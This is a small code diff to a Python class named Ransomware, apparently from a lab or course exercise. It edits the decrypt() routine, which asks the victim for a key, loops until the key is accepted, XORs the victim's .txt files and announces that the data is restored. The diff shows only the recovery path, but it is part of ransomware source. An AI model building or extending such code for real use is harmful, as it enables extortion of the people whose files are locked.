@@ -60,11 +60,11 @@ class Ransomware:
         self._log.debug("PASSING THROUGH decrypt() FUNCTION!!!!")
         self._secret_manager.load()
         candidate_key = input("Please enter your cryptographic key: ")
-        while not self._secret_manager.check_key(candidate_key):
+        while not self._secret_manager.set_key(candidate_key):
             print("The key you have entered is incorrect.")
             candidate_key = input("Please enter your cryptographic key: ")
 
-        self._secret_manager.set_key(candidate_key)
+        # self._secret_manager.set_key(candidate_key)
         self._secret_manager.xorfiles(self.get_files("*.txt"))
         self._secret_manager.clean()
         print("\rOkay, your data has been restored to its former state. Have a nice day :)")
